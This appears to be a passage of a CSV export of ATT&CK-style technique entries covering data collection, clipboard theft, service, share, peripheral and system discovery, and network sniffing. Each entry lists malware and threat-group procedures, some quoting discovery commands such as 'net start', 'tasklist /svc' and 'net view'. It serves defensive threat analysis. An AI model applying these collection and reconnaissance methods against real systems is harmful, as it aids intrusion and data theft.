T1119,Automated Collection,"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter] to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals.   In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.   This functionality could also be built into remote access tools.   This technique may incorporate use of other techniques such as [File and Directory Discovery] and [Lateral Tool Transfer] to identify and move files, as well as [Cloud Service Dashboard] and [Cloud Storage Object Discovery] to identify resources in cloud environments.","['[T9000] searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.', '[Rover] automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.', '[Micropsia] executes an RAR tool to recursively archive files based on a predefined list of file extensions (*.xls, *.xlsx, *.csv, *.odt, *.doc, *.docx, *.ppt, *.pptx, *.pdf, *.mdb, *.accdb, *.accde, *.txt).', '[ccf32] can be used to automatically collect files from a compromised host.', '[DarkGate] searches for stored credentials associated with cryptocurrency wallets and notifies the command and control server when identified.', '[Gamaredon Group] has deployed scripts on compromised systems that automatically scan for interesting documents.', '[Comnie] executes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server.', 'During [Operation Wocao] threat actors used a script to collect information about the infected system.', '[ROADTools] automatically gathers data from Azure AD environments using the Azure Graph API.', '[NETWIRE] can automatically archive collected data.', '[PoshC2] contains a module for recursively parsing through files and directories to gather valid credit card numbers.', '[PoetRAT] used file system monitoring to track modification and enable automatic exfiltration.', '[Empire] can automatically gather the username, domain name, machine name, and other information from a compromised system.', '[APT1] used a batch script to perform a series of discovery techniques and saves it to a text file.', '[Proxysvc] automatically collects data about the victim and sends it to the control server.', '[BADNEWS] monitors USB devices and copies files with certain extensions to a predefined directory.', '[TajMahal] has the ability to index and compress files into a send queue for exfiltration.', '[Ke3chang] has performed frequent and scheduled data collection from victim networks.', '[FIN5] scans processes on all victim systems in the environment and uses automated scripts to pull back the results.', '[VERMIN] saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .', '[Metamorfo] has automatically collected mouse clicks, continuous screenshots on the machine, and set timers to collect the contents of the clipboard and website browsing. ', '[APT28] used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.', '[WindTail] can identify and add files that possess specific file extensions to an array for archiving.', 'For all non-removable drives on a victim, [USBStealer] executes automated collection of certain files for later exfiltration.', '[AppleSeed] has automatically collected data from USB drives, keystrokes, and screen images before exfiltration.', '[Valak] can download a module to search for and build a report of harvested credential data.', '[OutSteel] can automatically scan for and collect files with specific extensions.', '[LightNeuron] can be configured to automatically collect files under a specified directory.', '[Bankshot] recursively generates a list of files within a directory and sends them back to the control server.', ""[PACEMAKER] can enter a loop to read `/proc/` entries every 2 seconds in order to read a target application's memory."", '[StrongPity] has a file searcher component that can automatically collect and archive files based on a predefined list of file extensions.', '[FunnyDream] can monitor files for changes and automatically collect them.', '[Attor] has automatically collected data about the compromised system.', '[Confucius] has used a file stealer to steal documents and images with the following extensions: txt, pdf, png, jpg, doc, xls, xlm, odp, ods, odt, rtf, ppt, xlsx, xlsm, docx, pptx, and jpeg.', '[OilRig] has used automated collection.', '[Ramsay] can conduct an initial scan for Microsoft Word documents on the local system, removable media, and connected network drives, before tagging and collecting them. It can continue tagging documents to collect with follow up scans.\t', '[RTM] monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.', 'During [Frankenstein] the threat actors used [Empire] to automatically gather the username, domain name, machine name, and other system information.', '[FIN6] has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button.', '[Patchwork] developed a file stealer to search C:\\ and collect files with certain extensions. [Patchwork] also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.', ""[Tropic Trooper] has collected information automatically using the adversary's [USBferry] attack.\t"", '[Sidewinder] has used tools to automatically collect system and network configuration information.', '[Chimera] has used custom DLLs for continuous retrieval of data from memory.', '[GoldFinder] logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node.  ', ""[Threat Group-3390] ran a command to compile an archive of file types of interest from the victim user's directories."", '[Mythic] supports scripting of file downloads from agents.\t', '[Mustang Panda] used custom batch scripts to collect files automatically from a targeted system.', '[InvisiMole] can sort and collect specific documents as well as generate a list of all files on a newly inserted drive and store them in an encrypted file.', '[Crutch] can automatically monitor removable drives in a loop and copy interesting files.', 'A [Helminth] VBScript receives a batch script to execute a set of commands in a command prompt.', 'Depending on the Linux distribution, [RotaJakiro] executes a set of commands to collect device information and sends the collected information to the C2 server.', '[Pacu] can automatically collect data, such as CloudFormation templates, EC2 user data, AWS Inspector reports, and IAM credential reports.', '[Zebrocy] scans the system and automatically collects files with the following extensions: .doc, .docx, ,.xls, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .jpeg, .bmp, .tiff, .kum, .tlg, .sbx, .cr, .hse, .hsf, and .lhz.', '[menuPass] has used the Csvde tool to collect Active Directory files and data.', '[LoFiSe] can collect all the files from the working directory every three hours and place them into a password-protected archive for further exfiltration.', '[ShimRatReporter] gathered information automatically, without instruction from a C2, related to the user and host machine that is compiled into a report and sent to the operators.', '[MESSAGETAP] checks two files, keyword_parm.txt and parm.txt, for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic. If an SMS message contained either a phone number, IMSI number, or keyword that matched the predefined list, it is saved to a CSV file for later theft by the threat actor.', '[Frankenstein] has enumerated hosts via [Empire] gathering the username, domain name, machine name, and other system information.', '[Operation Wocao] has used a script to collect information about the infected system.']",False
T1115,Clipboard Data,"Adversaries may collect data stored in the clipboard from users copying information within or between applications.   For example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., [Transmitted Data Manipulation]  macOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.","['[Agent Tesla] can steal data from the victim’s clipboard.', '[APT39] has used tools capable of stealing contents of the clipboard.', '[RTM] collects data from the clipboard.', '[DarkComet] can steal data from the clipboard.', '[Astaroth] collects information from the clipboard by using the OpenClipboard() and GetClipboardData() libraries. ', '[TinyZBot] contains functionality to collect information from the clipboard.', '[Empire] can harvest clipboard data on both Windows and macOS systems.', '[Attor] has a plugin that collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs.', '[Remcos] steals and modifies data from the clipboard.', '[VERMIN] collects data stored in the clipboard.', 'During [Operation Wocao] threat actors collected clipboard data in plaintext.', '[KONNI] had a feature to steal data from the clipboard.', '[Remexi] collects text from the clipboard.', '[MacSpy] can steal clipboard contents.', '[Cadelspy] has the ability to steal data from the clipboard.', '[Koadic] can retrieve the current content of the user clipboard.', '[CosmicDuke] copies and exfiltrates the clipboard contents every 30 seconds.', '[Clambling] has the ability to capture and store clipboard data.', '[DarkTortilla] can download a clipboard information stealer module.', ""[Metamorfo] has a function to hijack data from the clipboard by monitoring the contents of the clipboard and replacing the cryptocurrency wallet with the attacker's."", '[Machete] hijacks the clipboard data by creating an overlapped window that listens to keyboard events. ', 'A [JHUHUGIT] variant accesses a screenshot saved in the clipboard and converts it to a JPG image.', '[ROKRAT] can extract clipboard data from a compromised host.', '[Grandoreiro] can capture clipboard data from a compromised host.', 'The executable version of [Helminth] has a module to log clipboard contents.', '[Catchamas] steals data stored in the clipboard.', '[jRAT] can capture clipboard data.', '[Explosive] has a function to use the OpenClipboard wrapper. ', '[APT38] used a Trojan called KEYLIME to collect data from the clipboard.', '[DarkGate] starts a thread on execution that captures clipboard data and logs it to a predefined log file.', '[Zeus Panda] can hook GetClipboardData function to watch for clipboard pastes to collect.', '[Melcoz] can monitor content saved to the clipboard.', '[RunningRAT] contains code to open and copy data from the clipboard.', '[Mispadu] has the ability to capture and replace Bitcoin wallet data in the clipboard on a compromised host.', '[FlawedAmmyy] can collect clipboard data.', '[MarkiRAT] can capture clipboard content.', '[TajMahal] has the ability to steal data from the clipboard of an infected host. ', '[Operation Wocao] has collected clipboard data in plaintext.']",False
T1103,AppInit DLLs,"Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.  Similar to [Process Injection] these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.   The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. ",[],True
T1007,System Service Discovery,"Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.  Adversaries may use the information from [System Service Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","['[Ursnif] has gathered information about running services.', '[BRONZE BUTLER] has used TROJ_GETVERSION to discover system services.', '[Sykipot] may use <code>net start</code> to display running services.', '[Comnie] runs the command: <code>net start >> %TEMP%\\info.dat</code> on a victim.', '[SysUpdate] can collect a list of services on a victim machine.', 'The <code>net start</code> command can be used in [Net] to find information about Windows services.', ""[TeamTNT] has searched for services such as Alibaba Cloud Security's aliyun service and BMC Helix Cloud Security's bmc-agent service in order to disable them."", '[Elise] executes <code>net start</code> after initial communication is made to the remote server.', '[PoshC2] can enumerate service and service permission information.', '[Indrik Spider] has used the win32_service WMI class to retrieve a list of services from the system. ', '[SLOTHFULMEDIA] has the capability to enumerate services.', '[Kwampirs] collects a list of running services with the command <code>tasklist /svc</code>.', '[Tasklist] can be used to discover services running on a system.', '[jRAT] can list local services.', '[RATANKBA] uses <code>tasklist /svc</code> to display running tasks.', '[OilRig] has used <code>sc query</code> on a victim to gather information about services.', '[Turla] surveys a system upon check-in to discover running services and associated processes using the <code>tasklist /svc</code> command.', '[BBSRAT] can query service configuration information.', '[RainyDay] can create and register a service for execution.', '[Cobalt Strike] can enumerate services on compromised hosts.', '[Volgmer] queries the system to identify existing services.', '[LookBack] can enumerate services on the victim machine.', '[Heyoka Backdoor] can check if it is running as a service on a compromised host.', '[Aquatic Panda] has attempted to discover services for third party EDR products.', 'After compromising a victim, [Poseidon Group] discovers all running services.', ""[Kimsuky] has used an instrumentor script to gather the names of all services running on a victim's system."", '[Caterpillar WebShell] can obtain a list of the services from a system. ', '[Chimera] has used <code>net start</code> and <code>net use</code> for system service discovery.', '[Ke3chang] performs service discovery using <code>net start</code> commands.', '[InvisiMole] can obtain running services on the victim.', '[GreyEnergy] enumerates all Windows services.', '[SUNBURST] collected a list of service names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.', '[HyperBro] can list all services and their configurations.', '[Black Basta] can check whether the service name FAX is present.', '[Hydraq] creates a backdoor through which remote attackers can monitor services.', '[GravityRAT] has a feature to list the available services on the system.', '[REvil] can enumerate active services.', '[Cuba] can query service status using <code>QueryServiceStatusEx</code> function.', '[SynAck] enumerates all running services.', '[Sardonic] has the ability to execute the `net start` command.', '[HotCroissant] has the ability to retrieve a list of services on the infected host.', '[Earth Lusca] has used [Tasklist] to obtain information from a compromised host.', '[S-Type] runs the command <code>net start</code> on a victim.', '[GeminiDuke] collects information on programs and services on the victim that are configured to automatically run at startup.', 'During [Operation Wocao] threat actors used the `tasklist` command to search for one of its backdoors.', '[ZLib] has the ability to discover and manipulate Windows services.', ""[DarkTortilla] can retrieve information about a compromised system's running services."", '[Emissary] has the capability to execute the command <code>net start</code> to interact with services.', '[Babuk] can enumerate all services running on a compromised host.', '[Ixeshe] can list running services.', '[SombRAT] can enumerate services on a victim machine.', '[WINERACK] can enumerate services.', '[Epic] uses the <code>tasklist /svc</code> command to list the services on the system.', '[BitPaymer] can enumerate existing Windows services on the host that are configured to run as LocalSystem.', '[TrickBot] collects a list of install programs and services on the system’s machine.', '[JPIN] can list running services.', '[admin@338] actors used the following command following exploitation of a machine with [LOWBALL] malware to obtain information about services: <code>net start >> %temp%\\download</code>', 'During [Operation CuckooBees] the threat actors used the `net start` command as part of their initial reconnaissance.', '[Dyre] has the ability to identify running services on a compromised host.', '[APT1] used the commands <code>net start</code> and <code>tasklist</code> to get a listing of the services on the system.', '[ZxShell] can check the services on the system. ', '[SILENTTRINITY] can search for modifiable services that could be used for privilege escalation.', '[Operation Wocao] has used the <code>tasklist</code> command to search for one of its backdoors.']",False
T1040,Network Sniffing,"Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.  Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay] can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.  Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement] and/or [Defense Evasion] activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle] (AiTM) to passively gain additional knowledge about the environment.  In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic. The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.  On network devices, adversaries may perform network captures using [Network Device CLI] commands such as `monitor capture`.","['[Sandworm Team] has used intercepter-NG to sniff passwords in network traffic.\t', '[Kimsuky] has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.', '[Impacket] can be used to sniff network traffic via an interface or raw socket.', '[NBTscan] can dump and print whole packet content.\t', '[MESSAGETAP] uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.  ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] used [BlackEnergy] network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid’s industrial control systems. ', '[Penquin] can sniff network traffic to look for packets matching specific conditions.', '[FoggyWeb] can configure custom listeners to passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor.', '[Empire] can be used to conduct packet captures on target hosts.', '[Responder] captures hashes and credentials that are sent to the system after the name services have been poisoned.', '[Emotet] has been observed to hook network APIs to monitor network traffic. ', '[APT33] has used SniffPass to collect credentials by sniffing network traffic.', '[DarkVishnya] used network sniffing to obtain login data. ', '[APT28] deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials. [APT28] close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.', '[PoshC2] contains a module for taking packet captures on compromised hosts.', '[Regin] appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.', '[Stolen Pencil] has a tool to sniff the network for passwords. ']",False
T1017,Application Deployment Software,"Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.  Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.",[],True
T1530,Data from Cloud Storage,"Adversaries may access data from cloud storage.  Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform.   In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API] In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories]   Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.  This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.  Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.","[""[Fox Kitten] has obtained files from the victim's cloud storage instances."", '[Peirates] can dump the contents of AWS S3 buckets. It can also retrieve service account tokens from kOps buckets in Google Cloud Storage or S3.', '[Scattered Spider] enumerates data stored in cloud resources for collection and exfiltration purposes.', '[Pacu] can enumerate and download files stored in AWS storage services, such as S3 buckets.', 'During [C0027] [Scattered Spider] accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.', 'AADInternals can collect files from a user’s OneDrive.']",False
T1135,Network Share Discovery,"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.   File sharing over a Windows network occurs over the SMB protocol.   [Net] can be used to query a remote system for available shared drives using the <code>net view \\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.","[""[BADHATCH] can check a user's access to the C$ share on a compromised machine. "", '[Ramsay] can scan for network drives which may contain documents for collection.\t', 'During [C0015] the threat actors executed the PowerView ShareFinder module to identify open shares.', '[Conti] can enumerate remote open SMB network shares using <code>NetShareEnum()</code>.', '[Tonto Team] has used tools such as [NBTscan] to enumerate network shares.', '[Pupy] can list local and remote shared drives and folders over SMB.', '[Bazar] can enumerate shared drives on the domain.', '[Cuba] can discover shared resources using the <code>NetShareEnum</code> API call. ', '[Kwampirs] collects a list of network shares with the command <code>net share</code>.', '[QakBot] can use <code>net share</code> to identify network shares for use in lateral movement.', '[APT39] has used the post exploitation tool [CrackMapExec] to enumerate network shares.', '[SILENTTRINITY] can enumerate shares on a compromised host.', '[Diavol] has a `ENMDSKS` command to enumerates available network shares. ', '[DarkVishnya] scanned the network for public shared folders.', 'The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in [Net] can be used to find shared drives and directories on remote and local systems respectively.', '[APT32] used the <code>net view</code> command to show all shares available, including the administrative shares such as <code>C$</code> and <code>ADMIN$</code>.', '[FIVEHANDS] can enumerate network shares and mounted drives on a network.', '[Emotet] has enumerated non-hidden network shares using `WNetEnumResourceW`. ', ' [APT41] used the <code>net share</code> command as part of network reconnaissance.', '[Sardonic] has the ability to execute the `net view` command.', '[PlugX] has a module to enumerate network shares.', '[CrackMapExec] can enumerate the shared folders and associated permissions for a targeted network.', '[BitPaymer] can search for network shares on the domain or workgroup using <code>net view <host></code>.', '[Empire] can find shared drives on the local system.', '[Chimera] has used <code>net share</code> and <code>net view</code> to identify network shares of interest.', '[Bad Rabbit] enumerates open SMB shares on internal victim networks.', '[TrickBot] module shareDll/mshareDll discovers network shares via the WNetOpenEnumA API.', 'During [Operation Wocao] threat actors discovered network disks mounted to the system using [netstat]', '[KOPILUWAK] can use [netstat] and [Net] to discover network shares.', '[Akira] can identify remote file shares for encryption.', '[APT38] has enumerated network shares on a compromised host.', '[Royal] can enumerate the shared resources of a given IP addresses using the API call `NetShareEnum`.', '[WhisperGate] can enumerate connected remote logical drives.', '[HELLOKITTY] has the ability to enumerate network resources.', '[Clambling] has the ability to enumerate network shares.', '[BlackCat] has the ability to discover network shares on compromised networks.', '[Cobalt Strike] can query shared drives on the local system.', '[Avaddon] has enumerated shared folders and mapped volumes.', '[Flagpro] has been used to execute `net view` to discover mapped network shares.', '[Clop] can enumerate network shares.', '[Babuk] has the ability to enumerate network shares.', '[FIN13] has executed net view commands for enumeration of open shares on compromised machines.', '[Tropic Trooper] used <code>netview</code> to scan target systems for shared resources.', '[WastedLocker] can identify network adjacent and accessible drives.', '[Olympic Destroyer] will attempt to enumerate mapped network shares to later attempt to wipe all files on those shares.', '[Sowbug] listed remote shared drives that were accessible from a victim.', '[MURKYTOP] has the capability to retrieve information about shares on remote hosts.', '[OSInfo] discovers shares on the network', '[Stuxnet] enumerates the directories of a network resource.', '[ShimRat] can enumerate connected drives for infected host machines.', '[Dragonfly] has identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.', '[AvosLocker] has enumerated shared drives on a compromised network.', 'During [Operation CuckooBees] the threat actors used the `net share` command as part of their advanced reconnaissance.', '[APT1] listed connected network shares.', '[InvisiMole] can gather network share information.', '[Zebrocy] identifies network drives when they are added to victim systems.', '[Wizard Spider] has used the “net view” command to locate mapped network shares.', '[Koadic] can scan local network for open SMB.', '[DEATHRANSOM] has the ability to use loop operations to enumerate network resources.', '[QuietSieve] can identify and search networked drives for specific file name extensions.', '[Operation Wocao] has discovered network disks mounted to the system using netstat.', '[Dragonfly 2.0] identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.', '[Cobalt Strike] can query shared drives on the local system.', 'Dragonfly identified and browsed file servers on the victim network, viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.']",False
T1120,Peripheral Device Discovery,"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.","['[Equation] has used tools with the functionality to search for specific information about the attached hard drive that could be used to identify and overwrite the firmware.', 'During [Operation CuckooBees] the threat actors used the `fsutil fsinfo drives` command as part of their advanced reconnaissance.', '[APT37] has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. ', '[jRAT] can map UPnP ports.', '[Crutch] can monitor for removable drives being plugged into the compromised machine.', 'The [FunnyDream] FilepakMonitor component can detect removable drive insertion.', '[njRAT] will attempt to detect if the victim system has a camera during the initial infection. [njRAT] can also detect any removable drives connected to the system.', '[Mongall] can identify removable media attached to compromised hosts. ', 'A module in [Prikormka] collects information on available printers and disk drives.', '[WannaCry] contains a thread that will attempt to scan for new attached drives every few seconds. If one is identified, it will encrypt the files on the attached device.', '[Zebrocy] enumerates information about connected storage devices.', '[RTM] can obtain a list of smart card readers attached to the victim.', '[ObliqueRAT] can discover pluggable/removable drives to extract files from.', '[Bandook] can detect USB devices.', '[Ramsay] can scan for removable media which may contain documents for collection.\t', '[APT28] uses a module to receive a notification every time a USB mass storage device is inserted into a victim.', '[USBferry] can check for connected USB devices.', '[MoonWind] obtains the number of removable drives from the victim.', '[DustySky] can detect connected USB devices.', '[Attor] has a plugin that collects information about inserted storage devices, modems, and phone devices.', '[SVCReady] can check for the number of devices plugged into an infected host.', '[Ferocious] can run <code>GET.WORKSPACE</code> in Microsoft Excel to check if a mouse is present.', '[BlackEnergy] can gather very specific information about attached USB devices, to include device instance ID and drive geometry.', '[Turla] has used <code>fsutil fsinfo drives</code> to list connected drives.', '[OilRig] has used tools to identify if a mouse is connected to a targeted system.', '[Crimson] has the ability to discover pluggable/removable drives to extract files from.', '[Stuxnet] enumerates removable drives for infection.', '[FlawedAmmyy] will attempt to detect if a usable smart card is current inserted into a card reader.', '[ADVSTORESHELL] can list connected devices.', '[WastedLocker] can enumerate removable drives prior to the encryption process.', '[QuietSieve] can identify and search removable drives for specific file name extensions.', '[QakBot] can identify peripheral devices on targeted systems.', 'During [Operation Wocao] threat actors discovered removable disks attached to a system.', '[Machete] detects the insertion of new devices by listening for the WM_DEVICECHANGE window message.  ', '[TeamTNT] has searched for attached VGA devices using lspci.', '[NightClub] has the ability to monitor removable drives.', '[Gamaredon Group] tools have contained an application to check performance of USB flash drives. [Gamaredon Group] has also used malware to scan for removable drives.', '[BackdoorDiplomacy] has used an executable to detect removable media, such as USB flash drives.', ""[Heyoka Backdoor] can identify removable media attached to victim's machines."", '[Cadelspy] has the ability to steal information about printers and the documents sent to printers.', '[Ragnar Locker] may attempt to connect to removable drives and mapped network drives.', '[T9000] searches through connected drives for removable storage devices.', '[TajMahal] has the ability to identify connected Apple devices.', '[SharpDisco] has dropped a plugin to monitor external drives to `C:\\Users\\Public\\It3.exe`.', '[Turian] can scan for removable media to collect data.', '[USBStealer] monitors victims for insertion of removable drives. When dropped onto a second victim, it also enumerates drives connected to the system.', '[BADNEWS] checks for new hard drives on the victim, such as USB devices, by listening for the WM_DEVICECHANGE window message.', '[DarkWatchman] can list signed PnP drivers for smartcard readers.', '[Operation Wocao] has discovered removable disks attached to a system.', '[XAgentOSX] contains the showBackupIosFolder function to check for IOS device backups by running <code>ls -la ~/Library/Application\\ Support/MobileSync/Backup/</code>.']",
T1082,System Information Discovery,"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Tools such as [Systeminfo] can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI] on network devices to gather detailed system information (e.g. <code>show version</code>). [System Information Discovery] combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.  Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.","['[Micropsia] gathers the hostname and OS version from the victim’s machine.', '[njRAT] enumerates the victim operating system and computer name during the initial infection.', ""[DarkGate] uses the Delphi methods <code>Sysutils::DiskSize</code> and <code>GlobalMemoryStatusEx</code> to collect disk size and physical memory as part of the malware's anti-analysis checks for running in a virtualized environment. [DarkGate] will gather various system information such as display adapter description, operating system type and version, processor type, and RAM amount."", '[TrickBot] gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.', '[MoleNet] can collect information about the about the system.', '[YAHOYAH] checks for the system’s Windows OS version and hostname.', '[SYSCON] has the ability to use [Systeminfo] to identify system information.', '[Unknown Logger] can obtain information about the victim computer name, physical memory, country, and date.', '[Bumblebee] can enumerate the OS version and domain on a targeted system.', '[GravityRAT] collects the MAC address, computer name, and CPU information.', '[Linfo] creates a backdoor through which remote attackers can retrieve system information.', '[Koadic] can obtain the OS version and build, computer name, and processor architecture from a compromised host.', '[EnvyScout] can determine whether the ISO payload was received by a Windows or iOS device.', '[CharmPower] can enumerate the OS version and computer name on a targeted system.', '[Cuba] can enumerate local drives, disk type, and disk free space.', '[Stuxnet] collects system information including computer and domain names, OS version, and S7P paths.', '[Windigo] has used a script to detect which Linux distribution and version is currently installed on the system.', '[PLAINTEE] collects general system enumeration data about the infected machine and checks the OS version.', '[ADVSTORESHELL] can run [Systeminfo] to gather information about the victim.', '[SpeakUp] uses the <code>cat /proc/cpuinfo | grep -c “cpu family” 2>&1</code> command to gather system information. ', '[CARROTBAT] has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.', '[Torisma] can use `GetlogicalDrives` to get a bitmask of all drives available on a compromised system. It can also use `GetDriveType` to determine if a new drive is a CD-ROM drive.', '[KeyBoy] can gather extended system information, such as information about the operating system, disks, and memory.', '[OilRig] has run <code>hostname</code> and <code>systeminfo</code> on a victim.\t', '[Maze] has checked the language of the infected system using the ""GetUSerDefaultUILanguage"" function.', '[Rifdoor] has the ability to identify the Windows version on the compromised host.', '[Akira] uses the <code>GetSystemInfo</code> Windows function to determine the number of processors on a victim machine.', ""[FlawedAmmyy] can collect the victim's operating system and computer name during the initial infection."", '[ZIRCONIUM] has used a tool to capture the processor architecture of a compromised host in order to register it with C2.', '[Black Basta] can enumerate volumes and collect system boot configuration and CPU information.', '[Brave Prince] collects hard drive content and system configuration information.', '[Squirrelwaffle] has gathered victim computer information and configurations.', '[APT41] uses multiple built-in commands such as <code>systeminfo</code> and `net config Workstation` to enumerate victim system basic configuration information.', '[More_eggs] has the capability to gather the OS version and computer name.', 'During [C0017] [APT41] issued `ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+` commands to find the volume serial number of compromised systems. ', '[BlackMould] can enumerate local drives on a compromised host.', '[BLINDINGCAN] has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available.', '[STARWHALE] can gather the computer name of an infected host.', '[SLOWDRIFT] collects and sends system information to its C2.', '[Sardonic] has the ability to collect the computer name, CPU manufacturer name, and C:\\ drive serial number from a compromised machine. [Sardonic] also has the ability to execute the `ver` and `systeminfo` commands.', '[Bundlore] will enumerate the macOS version to determine which follow-on behaviors to execute using <code>/usr/bin/sw_vers -productVersion</code>.', '[LiteDuke] can enumerate the CPUID and BIOS version on a compromised system.', '[Elise] executes <code>systeminfo</code> after initial communication is made to the remote server.', '[SUNBURST] collected hostname and OS version.', '[GoldenSpy] has gathered operating system information.\t', '[down_new] has the ability to identify the 